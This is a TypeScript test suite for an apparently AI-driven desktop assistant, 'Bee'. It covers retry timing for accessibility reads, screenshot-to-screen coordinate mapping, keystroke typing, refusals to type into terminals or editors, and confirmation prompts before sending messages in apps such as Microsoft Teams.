    const { run, calls } = timedRun(() => ({ ok: true, data: tree(30, { complete: false }) }));
    expect(await setup({ run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" })).toMatch(/partial: raise detail with root/);
    expect(calls).toHaveLength(1);
  });

  it("never reads a region or a menu twice for being small, but reads a timed-out region again with more time", async () => {
    const { run, calls } = timedRun(({ args }, index) => {
      if (args.includes("--surface=menu")) return { ok: true, data: tree(1) };
      if (args.some((arg) => arg.startsWith("--root="))) return index === 2 ? { ok: false, code: "TIMEOUT", retry: "safe" } : { ok: true, data: tree(1) };
      return { ok: true, data: tree(8) };
    });
    const { call } = setup({ run, askFirst: false });
    await call("snapshot", { app: "Microsoft Teams" });
    await call("snapshot", { app: "Microsoft Teams", surface: "menu" });
    await call("snapshot", { root: "@s7:e1" });
    expect(calls.map(({ args }) => args.slice(2).join(" "))).toEqual([
      "--app=Microsoft Teams --timeout-ms=12000",
      "--app=Microsoft Teams --surface=menu --timeout-ms=12000",
      "--root=@s7:e1 --timeout-ms=12000",
      "--root=@s7:e1 --timeout-ms=25000",
    ]);
  });

  it("gives find a budget, and reads again once when that fails where a retry is safe", async () => {
    const { run, calls } = timedRun((_call, index) => (index === 0 ? { ok: false, code: "TIMEOUT", retry: "safe" } : { ok: true, data: { matches: [{ role: "textfield", name: "Type a message", ref_id: "@s8:e1" }] } }));
    const { call } = setup({ run, askFirst: false });
    expect(await call("find", { app: "Microsoft Teams", role: "textfield" })).toBe('textfield "Type a message" @s8:e1');
    expect(calls.map(({ args, timeoutMs }) => [args.at(-1), timeoutMs])).toEqual([
      ["--timeout-ms=12000", 18_000],
      ["--timeout-ms=25000", 31_000],
    ]);
  });

  it("reads a ref once more after a safe INTERNAL, and says a slow read is slow, not that something happened", async () => {
    const { run, calls } = timedRun(({ command }) => (command === "snapshot" ? { ok: true, data: SNAPSHOT } : { ok: false, code: "TIMEOUT", retry: "safe" }));
    const { call } = setup({ run, askFirst: false });
    await call("snapshot", { app: "Discord" });
    expect(await call("read", { ref: "@s1abc:e1" })).toMatch(/did not finish in time/);
    expect(calls.map(({ command }) => command)).toEqual(["snapshot", "get", "get"]);
  });

  it("turns a command the allowlist refuses into a clear error, never a generic failure", async () => {
    const run: ComputerRun = async () => {
      throw new Error("agent-desktop flag value not allowed: --app");
    };
    expect(await setup({ run, askFirst: false }).call("list_apps", {})).toMatch(/^Error REFUSED: Bee does not run that/);
  });

  it("logs agent-desktop's code and redacted message for every failed command", async () => {
    const events: DebugEvent[] = [];
    setDebugSink({ write: (event) => events.push(event), wants: () => true });
    try {
      const { run } = timedRun(() => INTERNAL);
      await setup({ run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" });
    } finally {
      setDebugSink(null);
    }
    const failed = events.filter((event) => event.event === "exec-failed");
    expect(failed).toHaveLength(2);
    expect(failed[0]).toMatchObject({ level: "warn", category: "computer", data: { command: "snapshot", code: "INTERNAL", message: "Accessibility deadline exhausted before IPC", retry: "safe" } });
  });
});

describe("click_at and typing without a ref", () => {
  // A PNG header: signature, the IHDR chunk's length and type, width and height.
  const png = (width: number, height: number) => {
    const head = Buffer.alloc(24);
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(head, 0);
    head.writeUInt32BE(13, 8);
    head.write("IHDR", 12, "ascii");
    head.writeUInt32BE(width, 16);
    head.writeUInt32BE(height, 20);
    return head.toString("base64") + "A".repeat(200);
  };
  const TEAMS = "Microsoft Teams";
  const WINDOW = { id: "w-7", app_name: TEAMS, title: "Chat | Microsoft Teams", bounds: { x: 100, y: 50, width: 1280, height: 800 }, is_focused: true };
  const INTERNAL: AgentDesktopResult = { ok: false, code: "INTERNAL", message: "Accessibility deadline exhausted before IPC", retry: "safe" };
  const COMPOSE = { role: "textfield", name: "Type a message", ref_id: "@s9:e3", states: ["focused"] };

  /** Teams whose tree fails; focused: what find --state=focused says after a click. */
  const teamsRun = (focused: AgentDesktopResult = INTERNAL, extra: (call: { command: string; args: string[] }) => AgentDesktopResult | null = () => null) => {
    const calls: Array<{ command: ComputerUseCommand; args: string[] }> = [];
    const run: ComputerRun = async (command, args) => {
      calls.push({ command, args });
      const special = extra({ command, args });
      if (special) return special;
      if (command === "screenshot") return { ok: true, data: { base64: png(2560, 1600) } };
      if (command === "list-windows") return { ok: true, data: { windows: [WINDOW] } };
      if (command === "find") return args.includes("--state=focused") ? focused : INTERNAL;
      if (command === "snapshot") return INTERNAL;
      return { ok: true, data: { disposition: { delivery: "delivered_unverified", retry: "unsafe" } } };
    };
    return { run, calls, commands: () => calls.map((call) => [call.command, ...call.args]) };
  };
  const found = (match: Record<string, unknown>): AgentDesktopResult => ({ ok: true, data: { snapshot_id: "s9", matches: [match] } });

  it("reads a PNG's size, and places a spot in a screenshot on screen (Retina, a moved window, a shadow)", () => {
    expect(pngSize(png(2560, 1600))).toEqual({ width: 2560, height: 1600 });
    expect(pngSize("A".repeat(200))).toBeNull();
    expect(pngSize("!!")).toBeNull();
    const bounds = { x: 100, y: 50, width: 1280, height: 800 };
    expect(screenPoint({ width: 1280, height: 800 }, bounds, 500, 500)).toEqual({ x: 740, y: 450 });
    expect(screenPoint({ width: 2560, height: 1600 }, bounds, 500, 900)).toEqual({ x: 740, y: 770 });
    expect(screenPoint({ width: 2560, height: 1600 }, { ...bounds, x: -1280 }, 0, 0)).toEqual({ x: -1280, y: 50 });
    expect(screenPoint({ width: 2560, height: 1600 }, bounds, 1000, 1000)).toEqual({ x: 1379, y: 849 });
    // A shadow 40 px each side round a 2x picture.
    expect(screenPoint({ width: 2640, height: 1680 }, bounds, 500, 500)).toEqual({ x: 740, y: 450 });
    expect(screenPoint({ width: 2640, height: 1680 }, bounds, 0, 0)).toBe("outside");
    // Windows at 150%, and a window whose bounds include an invisible 7 px border the picture leaves out.
    expect(screenPoint({ width: 1920, height: 1200 }, bounds, 500, 500)).toEqual({ x: 740, y: 450 });
    expect(screenPoint({ width: 1906, height: 1033 }, { x: 0, y: 0, width: 1920, height: 1040 }, 0, 0)).toEqual({ x: 7, y: 4 });
    // The window was resized since.
    expect(screenPoint({ width: 2560, height: 1600 }, { ...bounds, width: 900 }, 500, 500)).toBe("resized");
  });

  it("turns text into key presses: Shift for capitals, names for plain punctuation, nothing it would have to guess", () => {
    expect(keysFor("Hi, ok-2.")).toEqual({ keys: ["shift+h", "i", "comma", "space", "o", "k", "minus", "2", "period"], odd: [] });
    expect(keysFor("Late! £5 é?")).toMatchObject({ odd: ["!", "£", "é", "?"] });
  });

  it("needs a screenshot of the app first, and never clicks in an app Bee does not use", async () => {
    const { run, calls } = teamsRun();
    const { call } = setup({ run, askFirst: false });
    expect(await call("click_at", { app: TEAMS, x: 500, y: 900, target: "message box", effect: "none" })).toMatch(/take a screenshot of that app first/);
    expect(await call("click_at", { app: "Terminal", x: 500, y: 900, target: "prompt", effect: "none" })).toMatch(/does not use/);
    expect(await call("click_at", { app: TEAMS, window_id: "w-999", x: 500, y: 900, target: "message box", effect: "none" })).toMatch(/window id/);
    expect(calls).toEqual([]);
  });

  it("brings the window forward and clicks the screen point under the spot, with real input", async () => {
    const front = vi.spyOn(desktop, "focusWindow");
    const { run, commands } = teamsRun();
    const { call } = setup({ run, askFirst: false });
    expect(await call("screenshot", { app: TEAMS })).toMatchObject({ text: "Screenshot of Microsoft Teams." });
    const line = await call("click_at", { app: TEAMS, x: 500, y: 900, target: "message box", effect: "none" });
    expect(line).toMatch(/^Done \(delivered_unverified\)\. Bee cannot see what has focus/);
    expect(front).toHaveBeenCalledWith({ app: TEAMS });
    expect(commands()).toEqual([
      ["screenshot", "--app=Microsoft Teams"],
      ["list-windows", "--app=Microsoft Teams"],
      ["mouse-click", "--xy=740,770", HEADED_FLAG],
      ["find", "--app=Microsoft Teams", "--window-id=w-7", "--state=focused", "--limit=5", "--timeout-ms=6000"],
    ]);
  });

  it("types into the field click_at focused by its ref, when the tree can name it", async () => {
    const { run, commands } = teamsRun(found(COMPOSE));
    const { call } = setup({ run, askFirst: false });
    await call("screenshot", { app: TEAMS });
    expect(await call("click_at", { app: TEAMS, x: 500, y: 900, target: "message box", effect: "none" })).toMatch(/The cursor is in textfield "Type a message" @s9:e3\./);
    expect(await call("type_text", { text: "Running late", effect: "none" })).toMatch(/^Done/);
    expect(commands().at(-1)).toEqual(["type", "@s9:e3", HEADED_FLAG, "--", "Running late"]);
  });

  it("types as key presses into the app when the tree cannot say what has focus", async () => {
    const { run, commands } = teamsRun();
    const { call } = setup({ run, askFirst: false });
    await call("screenshot", { app: TEAMS });
    await call("click_at", { app: TEAMS, x: 500, y: 900, target: "message box", effect: "none" });
    expect(await call("type_text", { text: "Hi, ok", effect: "none" })).toBe("Typed 6 characters as key presses (not checked). Check with a screenshot before pressing Return.");
    const presses = commands().filter(([command]) => command === "press");
    expect(presses.map((press) => press[1])).toEqual(["shift+h", "i", "comma", "space", "o", "k"]);
    for (const press of presses) expect(press.slice(2)).toEqual(["--app=Microsoft Teams", "--window-id=w-7", HEADED_FLAG]);
  });

  it("refuses to type without a ref when it cannot be done safely, and types nothing", async () => {
    const before = setup({ run: teamsRun().run, askFirst: false });
    expect(await before.call("type_text", { text: "hi", effect: "none" })).toMatch(/give a ref.*click_at/);
    const cases: Array<{ focused?: AgentDesktopResult; app?: string; target?: string; text: string; error: RegExp }> = [
      { text: "hi\nthere", error: /no line breaks/ },
      { text: "Late!", error: /Leave out: !/ },
      { text: "x".repeat(301), error: /at most 300 characters/ },
      { target: "Send button", text: "hi", error: /did not say it clicked a text field/ },
      { focused: found({ role: "button", name: "Send", ref_id: "@s9:e4", states: ["focused"] }), text: "hi", error: /focus is not in a text field/ },
      { focused: found({ role: "textarea", name: "Terminal 1, zsh", states: ["focused"] }), text: "ls", error: /terminals or consoles/ },
      { app: "Code", text: "ls", error: /code editor/ },
    ];
    for (const item of cases) {
      const { run, calls } = teamsRun(item.focused);
      const { call, asked } = setup({ run });
      const app = item.app ?? TEAMS;
      await call("screenshot", { app });
      await call("click_at", { app, x: 500, y: 900, target: item.target ?? "message box", effect: "none" });
      expect(await call("type_text", { text: item.text, effect: "none" }), item.text).toMatch(item.error);
      expect(calls.filter(({ command }) => command === "press" || command === "type"), item.text).toEqual([]);
      // A refused step asks nothing.
      expect(asked.filter((request) => !request.detail.startsWith("Click")), item.text).toEqual([]);
    }
  });

  it("forgets where click_at put the cursor once a key, a ref action or an app switch may have moved it", async () => {
    const { run } = teamsRun();
    const { call } = setup({ run, askFirst: false });
    await call("screenshot", { app: TEAMS });
    await call("click_at", { app: TEAMS, x: 500, y: 900, target: "message box", effect: "none" });
    await call("press_key", { keys: "tab", app: TEAMS, effect: "none" });
    expect(await call("type_text", { text: "hi", effect: "none" })).toMatch(/give a ref/);
    await call("click_at", { app: TEAMS, x: 500, y: 900, target: "message box", effect: "none" });
    await call("focus_window", { app: "Slack" });
    expect(await call("type_text", { text: "hi", effect: "none" })).toMatch(/give a ref/);
  });
});

describe("click_at and typing without a ref: Confirm still asks", () => {
  const png = (width: number, height: number) => {
    const head = Buffer.alloc(24);
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13]).copy(head, 0);
    head.write("IHDR", 12, "ascii");
    head.writeUInt32BE(width, 16);
    head.writeUInt32BE(height, 20);
    return head.toString("base64") + "A".repeat(200);
  };
  const TEAMS = "Microsoft Teams";
  const run = (focused: AgentDesktopResult = { ok: false, code: "INTERNAL", retry: "safe" }) => {
    const commands: string[] = [];
    const runner: ComputerRun = async (command, args) => {
      commands.push(command);
      if (command === "screenshot") return { ok: true, data: { base64: png(1280, 800) } };
      if (command === "list-windows") return { ok: true, data: { windows: [{ id: "w-7", app_name: TEAMS, title: "Chat", bounds: { x: 0, y: 0, width: 1280, height: 800 }, is_focused: true }] } };
      if (command === "find" && args.includes("--state=focused")) return focused;
      return { ok: true, data: {} };
    };
    return { runner, commands };
  };

  it("asks before Return after typing into a field Bee never saw, as a send", async () => {
    const { runner } = run();
    const { call, asked } = setup({ run: runner });
    await call("screenshot", { app: TEAMS });
    await call("click_at", { app: TEAMS, x: 500, y: 900, target: "message box", effect: "none" });
    await call("type_text", { text: "Running late", effect: "none" });
    expect(asked).toEqual([]);
    await call("press_key", { keys: "return", app: TEAMS, effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail])).toEqual([["send", "Press Return in Microsoft Teams"]]);
  });

  it("asks before Return after a click with focus unknown, and as a send in the field the tree named", async () => {
    const unknown = setup({ run: run().runner });
    await unknown.call("screenshot", { app: TEAMS });
    await unknown.call("click_at", { app: TEAMS, x: 500, y: 900, target: "message box", effect: "none" });
    await unknown.call("press_key", { keys: "return", app: TEAMS, effect: "none" });
    expect(unknown.asked.map((request) => request.kind)).toEqual(["submit"]);
    const named = setup({ run: run({ ok: true, data: { matches: [{ role: "textfield", name: "Type a message", ref_id: "@s9:e3", states: ["focused"] }] } }).runner });
    await named.call("screenshot", { app: TEAMS });
    await named.call("click_at", { app: TEAMS, x: 500, y: 900, target: "message box", effect: "none" });
    await named.call("press_key", { keys: "return", app: TEAMS, effect: "none" });
    expect(named.asked.map((request) => [request.kind, request.detail])).toEqual([["send", "Press Return in “Type a message”"]]);
  });

  it("asks before clicking what reads as Send, whatever the effect, and before any click once text is typed", async () => {
    const { runner, commands } = run();
    const { call, asked } = setup({ run: runner, confirm: async (request) => request.detail !== "Click “Send arrow” in Microsoft Teams" || false });
    await call("screenshot", { app: TEAMS });
    await call("click_at", { app: TEAMS, x: 500, y: 900, target: "message box", effect: "none" });
    expect(asked).toEqual([]);
    await call("type_text", { text: "Running late", effect: "none" });
    await call("click_at", { app: TEAMS, x: 500, y: 900, target: "message box", effect: "none" });
    expect(asked.map((request) => [request.kind, request.detail])).toEqual([["send", "Click “message box” in Microsoft Teams"]]);
    // Cancel: the click never happens and the task stops.
    expect(await call("click_at", { app: TEAMS, x: 960, y: 900, target: "Send arrow", effect: "none" })).toBe(STOPPED);
    expect(asked.at(-1)).toMatchObject({ kind: "send", question: "Send this?" });
    expect(commands.filter((command) => command === "mouse-click")).toHaveLength(2);
  });

  it("asks nothing for a step it will refuse, even when the AI says it sends", async () => {
    const { runner, commands } = run();
    const { call, asked } = setup({ run: runner });
    expect(await call("type_text", { text: "hi", effect: "send" })).toMatch(/give a ref/);
    await call("screenshot", { app: TEAMS });
    await call("click_at", { app: TEAMS, x: 500, y: 900, target: "message box", effect: "none" });
    expect(await call("type_text", { text: "Running late\n", effect: "send" })).toMatch(/no line breaks/);
    expect(await call("type_text", { text: "Late!", effect: "send" })).toMatch(/Leave out: !/);
    expect(await call("click_at", { app: "Terminal", x: 1, y: 1, target: "Send", effect: "send" })).toMatch(/does not use/);
    expect(asked).toEqual([]);
    expect(commands.filter((command) => command === "press")).toEqual([]);
    // A step that will run still asks for what the AI says it does.
    await call("type_text", { text: "ok", effect: "send" });
    expect(asked.map((request) => request.kind)).toEqual(["send"]);
  });

  it("runs on its own with the setting off", async () => {
    const { runner, commands } = run();
    const { call, asked } = setup({ run: runner, askFirst: false });
    await call("screenshot", { app: TEAMS });
    await call("click_at", { app: TEAMS, x: 500, y: 900, target: "Send button", effect: "send" });
    await call("type_text", { text: "ok", effect: "none" });
    await call("press_key", { keys: "return", app: TEAMS, effect: "none" });
    expect(asked).toEqual([]);
    expect(commands.filter((command) => command === "mouse-click")).toHaveLength(1);
  });
});
